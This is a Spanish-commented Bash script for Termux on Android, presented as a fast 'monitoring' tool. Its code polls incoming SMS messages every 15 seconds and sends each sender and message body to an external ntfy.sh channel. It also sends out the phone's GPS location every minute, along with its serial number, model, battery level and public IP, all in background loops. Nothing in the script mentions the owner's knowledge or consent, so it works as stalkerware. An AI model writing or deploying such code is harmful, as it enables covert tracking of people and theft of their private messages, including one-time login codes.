#!/bin/bash
# Script de Monitoreo Acelerado para Termux
# Versión optimizada para máxima velocidad

# ===== CONFIGURACIÓN =====
NTFY_URL="https://ntfy.sh/tu_canal_privado"  # Cambia esto por tu canal real
INTERVALO=300      # 5 minutos para recopilación completa
LOC_INTERVAL=60    # 1 minuto para ubicación
SMS_INTERVAL=15    # 15 segundos para verificar SMS
MAX_PARALLEL=3     # Máximo de procesos concurrentes

# ===== INICIALIZACIÓN =====
cleanup() {
    kill $(jobs -p) 2>/dev/null
    exit 0
}
trap cleanup EXIT TERM INT

# ===== FUNCIÓN DE ENVÍO ACELERADO =====
enviar_ntfy() {
    local msg="$1"
    [ -z "$msg" ] && return
    
    # Control de procesos paralelos
    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
        sleep 0.1
    done
    
    curl -sS -m 10 \
        -H "Priority: high" \
        -H "Tags: rocket" \
        -d "$msg" \
        "$NTFY_URL" >/dev/null 2>&1 &
}

# ===== OBTENER UBICACIÓN RÁPIDA =====
obtener_ubicacion() {
    local loc=$(timeout 10 termux-location -p network 2>/dev/null || 
                timeout 15 termux-location -p gps 2>/dev/null)
    
    if [ -n "$loc" ]; then
        local lat=$(echo "$loc" | jq -r '.latitude // empty')
        local lon=$(echo "$loc" | jq -r '.longitude // empty')
        
        [ -n "$lat" ] && [ -n "$lon" ] && \
        enviar_ntfy "📍 Ubicación|Lat: $lat|Lon: $lon|🗺️ maps.google.com?q=$lat,$lon"
    fi
}

# ===== MONITOR SMS ULTRA-RÁPIDO =====
monitor_sms() {
    local last_id=$(cat "$HOME/.last_sms_id" 2>/dev/null || echo "0")
    
    while true; do
        local new_sms=$(termux-sms-list -l 1 -d "since $(date -d '1 hour ago' +%s)" 2>/dev/null)
        local current_id=$(echo "$new_sms" | jq -r '.[0]._id // empty')
        
        if [ -n "$current_id" ] && [ "$current_id" != "$last_id" ]; then
            enviar_ntfy "📱 Nuevo SMS: $(echo "$new_sms" | jq -r '.[0] | .sender + ": " + .body')"
            echo "$current_id" > "$HOME/.last_sms_id"
            last_id="$current_id"
        fi
        
        sleep $SMS_INTERVAL
    done
}

# ===== RECOPILACIÓN PARALELA =====
recopilar_datos() {
    # Información del sistema (en paralelo)
    (
    model=$(getprop ro.product.model)
    serial=$(getprop ro.serialno)
    enviar_ntfy "📟 Dispositivo: $model | Serial: $serial"
    ) &
    
    # Estado de la batería (paralelo)
    (
    bat=$(termux-battery-status 2>/dev/null)
    [ -n "$bat" ] && enviar_ntfy "🔋 Batería: $(echo "$bat" | jq -r '.percentage')%"
    ) &
    
    # Información de red (paralelo)
    (
    ip=$(curl -sS -m 5 ifconfig.me)
    [ -n "$ip" ] && enviar_ntfy "🌐 IP: $ip"
    ) &
    
    wait
}

# ===== EJECUCIÓN PRINCIPAL =====
main() {
    # Verificar dependencias
    if ! command -v termux-location >/dev/null || ! command -v jq >/dev/null; then
        echo "Instalando dependencias..."
        pkg install -y termux-api jq >/dev/null 2>&1
    fi

    # Iniciar monitores en segundo plano
    monitor_sms &
    
    # Bucle principal
    while true; do
        start_time=$(date +%s)
        
        recopilar_datos
        obtener_ubicacion
        
        # Cálculo preciso del tiempo de espera
        elapsed=$(( $(date +%s) - start_time ))
        sleep_time=$(( INTERVALO - elapsed ))
        [ $sleep_time -gt 0 ] && sleep $sleep_time
    done
}

main
